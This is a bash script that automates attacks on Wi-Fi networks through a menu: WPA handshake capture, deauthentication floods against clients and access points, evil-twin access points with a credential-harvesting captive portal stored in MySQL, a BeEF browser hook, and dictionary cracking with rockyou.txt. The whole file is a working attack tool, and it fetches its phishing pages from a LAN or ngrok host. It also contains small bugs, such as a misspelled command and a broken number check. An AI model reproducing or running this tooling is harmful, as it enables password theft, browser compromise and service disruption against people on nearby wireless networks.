#!/bin/bash
cat <<-_EOF_
###########################################################################
#                                                           		      #
#                                                                         #
#                                  :)                                     #
#                                             	                          #
#                                                            		      #
###########################################################################                                                                 
	_EOF_
sleep 1

# Section defines variables and create file paths to ensure directories are properly filled.

NULL=>/dev/null
INDEX=index.html
ROGUE=Rogue_AP.zip
red=`tput setaf 1`
green=`tput setaf 2`
yellow=`tput setaf 3`
resetColor=`tput sgr0`
DELAY=3
MON=mon
service mysql start $NULL 
service apache2 stop 2&$NULL
gunzip /usr/share/wordlists/rockyou.txt.gz $NULL
echo 1 > /proc/sys/net/ipv4/ip_forward 				# Allows for internet access on setup AP
mkdir ~/Handshakes/ $NULL
mkdir /etc/beef/ $NULL
mkdir /var/ $NULL
mkdir /var/www/ $NULL
mkdir /var/www/html $NULL
clear

##################################################################################################

# Section displays user ip then asks for ip-input, checks if user is running program as root, then installs needed packages and updates system.

ifconfig eth0 | grep "inet\b" | awk '{print $2}' | cut -d/ -f1
read -p "${yellow}Enter your IP :${resetColor} " IPADDRESS # Make this auto fill 
clear
echo "${red}Make sure when you exit this script you use the function '7' unless you know how to revert the changes${resetColor}"
if [ $(id -u) == 0 ] ; then
	echo "${yellow}Congrats you're in root, Script can go on ... "
	sleep $DELAY
else 
	echo "${red}Please run again as root${resetColor}"
	exit
fi
read -p "${red}Is it okay if I install what the script needs to run [y/n]${resetColor} : " RUN
if [ $RUN == y ]; then
	apt install dnsmasq -y
	apt install macchanger -y 
	apt install dsniff -y
	apt install beef-xss -y
	apt install php5-mysql -y 
	apt install gnome-terminal -y
	clear
fi

##################################################################################################

# Section adds lines to end of NetworkManager.conf these lines stop the airmon + network manager conflict

read -p "${red}This is important to ensure I don't overwrite your files, Have you ran this script before? [y/n]${resetColor} : " NETWORKMGR
	if [ $NETWORKMGR == n ] ; then
		echo "" >> /etc/NetworkManager/NetworkManager.conf
		echo "[keyfile]
        unmanaged-devices:mac=AA:BB:CC:DD:EE:FF" >> /etc/NetworkManager/NetworkManager.conf 
	fi
	
##################################################################################################

# Section determines if the html packages are required, an ngrok code is required at this time, webserver on lan is hosting the files.

read -p "${red}Are you installing this with an ngrok code[n] or through lan[l]? Leave blank if you don't need the html files : ${resetColor}" HTML

	if [ $HTML == l ] ; then
		rm -r /var/www/html $NULL
		sleep 1
		mkdir /var/www/html/ $NULL
		wget 192.168.2.21:8080/$INDEX
		wget 192.168.2.21:8080/$ROGUE
		sleep 1
		mv $INDEX /var/www/html
		unzip $ROGUE -d /var/www/html
		rm -r $ROGUE
		sleep 1
		read -p "${yellow}Hit enter once you've changed the beef config file under /var/www/html/index.html to your ip address : ${resetColor}"
		clear
	fi

	if [ $HTML == n ] ; then
		read -p "${yellow}Enter the code here [example 12345678]: ${resetColor}" NGROK
		rm -r /var/www/html $NULL
		sleep 1
		mkdir /var/www/html/ $NULL
		wget http://$NGROK.ngrok.io/$INDEX
		wget http://$NGROK.ngrok.io/$ROGUE
		sleep 1
		mv $INDEX /var/www/html
		unzip $ROGUE -d /var/www/html
		rm -r $ROGUE
		sleep 1
		read -p "${yellow}Hit enter once you've changed the beef config file under /var/www/html/index.html to your ip address : ${resetColor}"
		clear
	fi
clear
echo "${green}Setup is complete" 
clear

##################################################################################################

# Section allows user to select the interface they wish to put into monitor mode, this allows for packet capture and injection. The mac address is then changed to the same as the lines added to networkmanager.conf

iwconfig 
read -p " Which interface do you wish to use?${resetColor} : " INTERFACE # find way to limit output to just devices
echo "Changing MAC ... "
	sleep 2
	ifconfig $INTERFACE down 
	macchanger -m AA:BB:CC:DD:EE:FF $INTERFACE 
	ifconfig $INTERFACE up
	sleep 2
clear

##################################################################################################

# Section promts user for menu selection 

while [[ $(id -u) == 0 ]] ; do
	clear
	cat <<-_EOF_

        1) Capture Handshake
        2) Deauth Client 
        3) Deauth AccessPoint
        4) Deploy EvilTwin with Captive Portal
        5) Deploy EvilTwin with BEEF Hook
        6) Crack a Password
        7) Show Stored Passwords
        8) Exit Script

	_EOF_

	read -p "${green}Please select an option from the list ${resetColor}: " CHOICE 	
	if [[ "$CHOICE" =~ ^[1-8]$ ]]; then 															# Validates range of number to ensure program runs 1-7 

##################################################################################################

# Section makes sure the chosen interface is up, starts monitor mode on that device, displays all nearby access points and a few bits of information on the target 

		if [[ $CHOICE == 1 ]] ; then
			echo "${green}Putting your chosen interface into monitor mode ... ${resetColor}"
			ifconfig $INTERFACE up 
			airmon-ng start $INTERFACE $NULL
			clear
			echo "I'm about to show you all the nearby access points, make sure it runs for 10-15 seconds and you copy the bssid and the channel you want to attack."
			sleep 5   
			airodump-ng $INTERFACE$MON 
			read -p "${yellow} Enter your target's bssid here ${resetColor} : " BSSID 
			read -p "${yellow} Enter your target's channel here ${resetColor} : " CHANNEL
			echo "I'm about to show you the devices on the specified network, make sure you ${red}LEAVE THIS OPEN${resetColor} and you copy the bssid and the station [Device] you want to attack."
			sleep $DELAY 
			echo " ${yellow} Now scanning ${BSSID} on channel ${CHANNEL} ... ${resetColor} "
			echo "${green} Storing the .cap file in the Handshakes Directory ${resetColor} "
			gnome-terminal -x airodump-ng $INTERFACE$MON --bssid $BSSID --channel $CHANNEL -w ~/Handshakes/handshake			# Opens in a new window the process that will be used to capture the 3 way handshake when the user attempts to reconnect the the access point. Writes to handshake file
			read -p "${yellow} Enter the station [Device] you wish to attack ${resetColor} : " DEVICE 
			read -p "${yellow} Specify how long you want the target to be deauthenticated for [10-10000] ${resetColor} " DEAUTH
			echo "${red} Now sending deauth packets ${resetColor} ... "
			gnome-terminal -x aireplay-ng -0 $DEAUTH -a $BSSID -c $DEVICE $INTERFACE$MON										# In new terminal deauths the selected client by sending the coresponding packets  
		fi

##################################################################################################

# Section is similar to the above, doesn't capture the handshake, useful to just quickly deauth a client 

		if [[ $CHOICE == 2 ]] ; then
			echo "${green} Putting your chosen interface into monitor mode ... ${resetColor}"
			ifconfig $INTERFACE up
			airmon-ng start $INTERFACE 
			clear
			echo "I'm about to show you all the nearby access points, make sure it runs for 5-10 seconds and you copy the bssid and the channel you want to attack."
			sleep 5   
			airodump-ng $INTERFACE$MON 
			read -p "${yellow}Enter your target's bssid here ${resetColor} : " BSSID
			read -p "${yellow}Enter your target's channel here ${resetColor} : " CHANNEL
			echo "I'm about to show you the devices on the specified network, LEAVE THIS OPEN"
			sleep 5 
			echo " ${yellow}Now scanning ${BSSID} on channel ${CHANNEL} ... ${resetColor} "
			gnome-terminal -x airodump-ng $INTERFACE$MON --bssid $BSSID --channel $CHANNEL 
			read -p "${yellow}Enter the station [Device] you wish to attack ${resetColor} : " DEVICE 
			read -p "${yellow}Specify how long you want the target to be deauthenticated for [10-10000] ${resetColor} " DEAUTH
			echo "${red}Now sending deauth packets ${resetColor} ... "
			airplay-ng -0 $DEAUTH -a $BSSID -c $DEVICE $INTERFACE$MON
		fi

##################################################################################################	

# Section is similar to option 1, doesn't capture the handshake, but will deauth a whole access point 

		if [[ $CHOICE == 3 ]] ; then
			echo "${green}Putting your chosen interface into monitor mode ... ${resetColor}"
			ifconfig $INTERFACE up
			airmon-ng start $INTERFACE $NULL
			clear
			echo "I'm about to show you all the nearby access points, make sure it runs for 5-10 seconds and you copy the bssid and the channel you want to attack."
			sleep 5   
			airodump-ng $INTERFACE$MON 
			read -p "${yellow}Enter your target's bssid here ${resetColor} : " BSSID
			read -p "${yellow}Enter your target's channel here ${resetColor} : " CHANNEL
			echo " ${yellow}Now scanning ${BSSID} on channel ${CHANNEL} ... ${resetColor} "
			gnome-terminal -x airodump-ng $INTERFACE$MON --bssid $BSSID --channel $CHANNEL 					
			read -p "${yellow}Specify how long you want the target to be deauthenticated for [10-10000] ${resetColor} " DEAUTH
			echo "${red}Now sending deauth packets ${resetColor} ... "
			aireplay-ng -0 $DEAUTH -a $BSSID $INTERFACE$MON
		fi

 ##################################################################################################

# Section will create a file in the /bin/ directory with the contents needed to setup a range of IP's for the client when they connect to the evil-twin network.
# Then will remove power restrictions based on region on the wifi adapter to ensure the signal is strong.

		if [[ $CHOICE == 4 ]] ; then
			echo "${green} Putting your chosen interface into monitor mode ... ${resetColor}"
			ifconfig $INTERFACE up
			airmon-ng start $INTERFACE $NULL
			clear
			echo "Setting up your dnsmasq.conf ... "
			echo -e "interface=at0\ndhcp-range=10.0.0.10,10.0.0.250,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\nserver=8.8.8.8\naddress=/#/$IPADDRESS\nlog-queries\nlog-dhcp\nlisten-address=127.0.0.1 " > /bin/dnsmasq.conf  
			sleep 1
			echo "Optimizing your access point ... "
			ifconfig $INTERFACE$MON down 
			iw reg set US
			ifconfig $INTERFACE$MON up 
			echo "${yellow}Setting up python server for captive AP in another tab${resetColor}"
			cd /var/www/html/Rogue_AP
			sleep 1
			gnome-terminal -x python3 -m http.server 80														# Apache ran into conflicts, python3 server is used to host files in new terminal
			sleep $DELAY
			clear
			echo "${green}I'm about to show you all the nearby access points, make sure it runs for 5-10 seconds and you copy the bssid and the channel you want to attack.${resetColor}"
			sleep 5   
			airodump-ng $INTERFACE$MON 
			read -p "${yellow}Enter your target's bssid here ${resetColor} : " BSSID
			read -p "${yellow}Enter your target's channel here ${resetColor} : " CHANNEL
			read -p "${yellow}Enter your target's ESSID [Name] here ${resetColor} : " ESSID
			echo " ${yellow}Now scanning ${BSSID} on channel ${CHANNEL} ... ${resetColor} "
			gnome-terminal -x airbase-ng -a $BSSID -e $ESSID --channel $CHANNEL -P $INTERFACE$MON				# starts evil-twin accesspoint, with the user provided information. -P increases the chances of the user connecting to AP without interaction 
			sleep 5 
			gnome-terminal -x ifconfig at0 10.0.0.1 up 														# airbase will create network device 'at0' this line brings up the interface and acts as the gateway for the client when they connnect
			echo "${yellow}Setting up iptables rules for NAT ...${resetColor}"								# iptables rules are configured to allow internet access to the connected client, allowing traffic in through at0 and out through eth0
			sleep $DELAY
			if [[ 1 == 1 ]] ; then																	
				iptables --flush
				iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE 
				iptables --append FORWARD --in-interface at0 -j ACCEPT 
				iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80 		# routes traffic to gateway 
				iptables -t nat -A POSTROUTING -j MASQUERADE												# masquerade creates a nat under the 10.0.0.1 subnet 
			fi	
			echo "${yellow}Setting up DNSmasq now, this will allow you to sniff traffic on clients connected to you.${resetColor}" 
			sleep 5
			gnome-terminal -x dnsmasq -C /bin/dnsmasq.conf -d 	# -C for loading configuration and -d for daemon mode
			echo "${green}Setting up the mysql database, the default password is 'fakeap' ${resetColor}"
			chmod 777 ~/smileFace/SQL-Setup.sql
			sleep $DELAY 
			mysql < ~/smileFace/SQL-Setup.sql
			sleep 2
			read -p "${yellow}Would you like to put a set of test values into the database to ensure it worked [y/n]? : ${resetColor}" TESTSQL
				if [ $TESTSQL == y ] ; then
					chmod 777 ~/smileFace/SQL-FakeapTEST.sql
					mysql -u fakeap -p < ~/smileFace/SQL-FakeapTEST.sql
					sleep 2
					echo "SQL setup complete"
				fi
				if [ $TESTSQL == n ] ; then
					echo "SQL setup complete"
				fi  										
  			sleep $DELAY
			clear
  			echo "${yellow}Setting up DNSspoof, allowing for site redirects.${resetColor}"
  			gnome-terminal -x dnsspoof -i at0																# opens another terminal, dnsspoof pointed to the at0 interface will redirect traffic to our Rougue_AP directory in our python server, as soon as the client loads their browser, emulating a public wifi network you have to sign into.
  			clear			
			read -p "${yellow}Specify how long you want the target to be deauthenticated for [10-10000] ${resetColor} " DEAUTH
			echo "${red}Now sending deauth packets ${resetColor} ... "
			gnome-terminal -x aireplay-ng -0 $DEAUTH -a $BSSID $INTERFACE$MON

		fi

##################################################################################################

# Section is almost identical to last, instead of a captive portal, redirects client to our index.html page which is a hooked webpage [beef] upon browser startup.
# Hooked browser will allow attacker to execute commands on the device as long as the user is on the webpage, uses a xss technique. Attack timing must be fast.

		if [[ $CHOICE == 5 ]] ; then
			echo "${green} Putting your chosen interface into monitor mode ... ${resetColor}"
			ifconfig $INTERFACE up
			airmon-ng start $INTERFACE $NULL
			clear
			echo "Setting up dnsmasq.conf ... "
			echo -e "interface=at0\ndhcp-range=10.0.0.10,10.0.0.250,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\nserver=8.8.8.8\naddress=/#/$IPADDRESS\nlog-queries\nlog-dhcp\nlisten-address=127.0.0.1 " > /etc/beef/dnsmasq.conf 
	        sleep 1
	        echo "${yellow}Setting up python server for the hooked browser in another tab${resetColor}"
			cd /var/www/html/
			sleep 1
			gnome-terminal -x python3 -m http.server 80
			echo "Optimizing your access point ... "
			ifconfig $INTERFACE$MON down 
			iw reg set US
			ifconfig $INTERFACE$MON up 
			sleep $DELAY
			clear
			echo "${green}I'm about to show you all the nearby access points, make sure it runs for 5-10 seconds and you copy the bssid and the channel you want to attack.${resetColor}"
			sleep 5   
			airodump-ng $INTERFACE$MON 
			read -p "${yellow}Enter your target's bssid here ${resetColor} : " BSSID
			read -p "${yellow}Enter your target's channel here ${resetColor} : " CHANNEL
			read -p "${yellow}Enter your target's ESSID [Name] here ${resetColor} : " ESSID
			echo " ${yellow}Now scanning ${BSSID} on channel ${CHANNEL} ... ${resetColor} "
			gnome-terminal -x airbase-ng -a $BSSID -e $ESSID --channel $CHANNEL -P $INTERFACE$MON 
			sleep 5 
			gnome-terminal -x ifconfig at0 10.0.0.1 up 
			
			echo "${yellow}Setting up iptables rules for NAT ...${resetColor}"
			sleep $DELAY
			if [[ 1 == 1 ]] ; then
				iptables --flush
				iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE 
				iptables --append FORWARD --in-interface at0 -j ACCEPT 
				iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80 
				iptables -t nat -A POSTROUTING -j MASQUERADE
			fi
			echo "${yellow}Setting up beef-xss now, it will open a web-console ...${resetColor}"				# opens webgui, if first time user will prompt for new password
			beef-xss	
			echo "${yellow}Setting up DNSmasq now, this will allow you to sniff traffic on clients connected to you.${resetColor}" 
			sleep 5
			gnome-terminal -x dnsmasq -C /etc/beef/dnsmasq.conf -d 	# -C for configuration and -d for daemon mode  										
  			sleep $DELAY
  			echo "${yellow}Setting up DNSspoof, allowing for site redirects.${resetColor}"
  			gnome-terminal -x dnsspoof -i at0	
  			clear			
			read -p "${yellow}Specify how long you want the target to be deauthenticated for [10-10000] ${resetColor} " DEAUTH
			echo "${red}Now sending deauth packets ${resetColor} ... "
			gnome-terminal -x aireplay-ng -0 $DEAUTH -a $BSSID $INTERFACE$MON
		fi

##################################################################################################

# Section will (if possible) crack a password using a handshake.cap file chosen by the user as well as the rockyou.txt password file  

		if [[ $CHOICE == 6 ]] ; then
			clear
			read -p "${yellow}Which handshake file do you want to use? [ex: 1] : ${resetColor}" HANDSHAKENUM
			if [[ "$HANDSHAKENUM" =~ ^[1-100]$ ]]; then
				echo "${green}Setting up the password crack, check your ~/Handshakes/ directory for the results ${resetColor}"
				sleep $DELAY
				aircrack-ng ~/Handshakes/handshake-0$HANDSHAKENUM.cap -w /usr/share/wordlists/rockyou.txt > ~/Handshakes/results 
			fi
		fi
	
##################################################################################################

# Section displays the created sql database with stored passwords from the rougue_AP captive portal

		if [[ $CHOICE == 7 ]] ; then
			mysql -u fakeap -p < SQL-Display.sql					# Displays the contents of the SQL database setup in option 4, with the setup username. User enters password
			sleep 5 
		fi

##################################################################################################

# Section reverts the changes made to the network adapter that was put into monitor mode, restarts network manager, flushes iptables and prompts user to purge the handshakes directory as it clutters fast.

		if [[ $CHOICE == 8 ]] ; then 
			echo "Cleaning up ... " 						# Find way to input ctrl + c to skip to this 
			airmon-ng stop $INTERFACE$MON $NULL
			ifconfig $INTERFACE up $NULL
			service network-manager restart
			iptables --flush
			sleep 1
			read -p "${red}Do you want me to purge your existing handshakes and cracked passwords results? [y/n]? : ${resetColor}" PURGE
			if [[ $PURGE == y ]] ; then 
				rm -r ~/Handshakes/
		
			fi
			exit
		fi

	fi
done